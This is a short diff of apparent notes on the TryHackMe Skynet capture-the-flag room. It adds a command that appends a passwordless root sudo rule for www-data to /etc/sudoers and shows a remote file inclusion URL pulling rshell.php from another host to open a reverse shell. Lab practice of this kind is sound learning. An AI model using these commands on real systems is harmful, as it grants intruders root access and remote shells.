@@ -164,7 +164,7 @@ This is where i got stuck and searched for help. Here is the syntax for obtainin
 Link: https://medium.com/azkrath/tryhackme-walkthrough-skynet-69399702ee5a
 
 
-
+echo ‘echo “www-data ALL=(root) NOPASSWD: ALL” >> /etc/sudoers’ > sudo.sh
 
 
 http://10.10.68.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.109.169/rshell.php
